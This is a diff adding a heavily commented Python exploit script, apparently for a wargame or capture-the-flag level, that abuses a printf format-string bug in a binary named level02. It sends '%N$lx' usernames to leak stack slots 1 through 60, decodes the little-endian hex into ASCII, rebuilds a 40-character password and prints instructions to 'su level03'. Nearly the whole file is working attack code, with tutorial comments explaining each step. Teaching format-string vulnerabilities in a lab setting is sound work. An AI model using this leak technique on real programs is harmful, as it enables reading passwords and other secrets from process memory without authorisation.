@@ -1,0 +1,166 @@
+-------------------------------------------------------------------------------------------------
+import subprocess  # lets us run programs from Python
+import struct      # lets us convert between numbers and raw bytes
+import re          # lets us search text with patterns (regex)
+
+# ============================================================
+# BACKGROUND — what is happening here at a high level
+#
+# The binary has this bug in its failure branch:
+#   printf(username)   ← user input used as format string
+#
+# When you type "%22$lx" as your username, printf treats it
+# as an instruction: "print stack slot 22 as a hex number"
+#
+# The password was loaded from password.txt into a local
+# variable on the stack. By probing stack slots one by one
+# we can read those bytes and reconstruct the password.
+# ============================================================
+
+prog = "/home/users/level02/level02"
+
+# ============================================================
+# FUNCTION: leak_one_slot(index)
+#
+# Runs the binary once, sends a format string as username,
+# sends a wrong password to trigger the failure branch,
+# then extracts the leaked hex value from the output.
+# ============================================================
+def leak_one_slot(index):
+
+    # Build the format string for this slot
+    # "%%%d$lx" % 22  →  "%22$lx"
+    #   %%   = literal % (escaped in Python string formatting)
+    #   %d   = insert the number (index)
+    #   $lx  = printf directive: print as 64-bit hex
+    username = "%%%d$lx" % index
+
+    # The binary calls fgets twice — once for username, once for password
+    # We send both separated by newline
+    # The password is deliberately wrong → triggers the printf(username) bug
+    stdin_input = username + "\n" + "wrongpassword\n"
+
+    # Start the binary as a subprocess
+    # stdin=PIPE  → we control what it reads
+    # stdout=PIPE → we capture what it prints
+    # stderr=STDOUT → merge error output with normal output
+    proc = subprocess.Popen(
+        [prog],
+        stdin  = subprocess.PIPE,
+        stdout = subprocess.PIPE,
+        stderr = subprocess.STDOUT
+    )
+
+    # Send our input, wait for it to finish, get the output
+    # .encode() converts Python string → bytes (required for PIPE)
+    # .decode() converts bytes → Python string so we can use regex on it
+    output = proc.communicate(stdin_input.encode())[0].decode(errors="replace")
+
+    # The binary prints the leaked value right before " does not have access!"
+    # Example output line: "756e505234376848 does not have access!"
+    # We use regex to capture the hex part
+    #   ([0-9a-fA-F]+)  = one or more hex characters  ← captured group
+    #   " does not have access!"  = fixed text after it
+    match = re.search(r'([0-9a-fA-F]+) does not have access!', output)
+    if match:
+        return match.group(1).strip()  # return just the hex string
+    return ""  # nothing matched → slot printed something non-hex
+
+
+# ============================================================
+# FUNCTION: hex_to_text(raw)
+#
+# Converts a leaked hex string back to readable ASCII characters
+#
+# WHY IS THIS NEEDED?
+# When printf prints a 64-bit value with %lx, it prints it as
+# one big hex integer. The bytes are in little-endian order —
+# the last character of the string is stored at the lowest
+# memory address, so when read as an integer it appears first.
+#
+# Example:
+#   The password bytes "Hh74RPnu" are stored in memory as:
+#   H=0x48  h=0x68  7=0x37  4=0x34  R=0x52  P=0x50  n=0x6e  u=0x75
+#
+#   x86 stores them little-endian (lowest address = least significant byte)
+#   so as a 64-bit integer: 0x756e505234376848
+#
+#   %lx prints: "756e505234376848"
+#
+#   To decode: read two hex chars at a time (= 1 byte each),
+#   then reverse the result to get original order.
+# ============================================================
+def hex_to_text(raw):
+
+    # Pad to exactly 16 hex characters = 8 bytes
+    # Short values like "77" become "0000000000000077"
+    # This ensures we always work with a full 64-bit slot
+    raw_padded = raw.zfill(16)
+
+    # Read 2 hex characters at a time (= 1 byte)
+    # Convert each pair to its ASCII character
+    # "75" → 0x75 → 'u'    "6e" → 0x6e → 'n'    etc.
+    text = ""
+    for i in range(0, 16, 2):          # i = 0, 2, 4, 6, 8, 10, 12, 14
+        byte_val = int(raw_padded[i:i+2], 16)   # two hex chars → integer
+        if 32 <= byte_val <= 126:       # printable ASCII range
+            text += chr(byte_val)       # integer → character
+        else:
+            text += "."                 # non-printable → dot placeholder
+
+    # Reverse because x86 little-endian puts the last character first
+    # "unPR47hH" reversed → "Hh74RPnu"
+    return text[::-1]
+
+
+# ============================================================
+# MAIN LOOP
+# Probe every stack slot from 1 to 60
+# Print what each slot contains
+# Collect slots that have readable (alphanumeric) content
+# ============================================================
+print("Probing stack slots...\n")
+print("slot | hex leak           | decoded text")
+print("-----|--------------------|--------------")
+
+password_pieces = {}   # dict: slot index → decoded text
+
+for i in range(1, 61):
+
+    raw = leak_one_slot(i)   # run binary, get hex string for slot i
+
+    if not raw:
+        continue             # skip if binary printed nothing useful
+
+    text = hex_to_text(raw)  # decode hex → ASCII characters
+
+    print("  %2d | %-18s | %s" % (i, raw, text))
+
+    # Only save slots that contain at least one letter or digit
+    # This filters out pure addresses (0x7fff...) and null bytes
+    if any(c.isalnum() for c in text):
+        password_pieces[i] = text
+
+
+# ============================================================
+# RECONSTRUCT PASSWORD
+#
+# The password is 40 characters stored across 5 stack slots
+# (5 slots × 8 bytes = 40 bytes)
+# We sort by slot index to get them in the right order
+# then join them together
+# ============================================================
+print("\n=== Password pieces found ===")
+for idx in sorted(password_pieces.keys()):
+    print("  slot %2d: %s" % (idx, password_pieces[idx]))
+
+print("\n=== Reconstructed password ===")
+full_password = ""
+for idx in sorted(password_pieces.keys()):
+    # .replace(".", "") removes dot placeholders for non-printable bytes
+    full_password += password_pieces[idx].replace(".", "")
+
+print(full_password)
+print("\nNow run:")
+print("  su level03")
+print("  password: " + full_password)
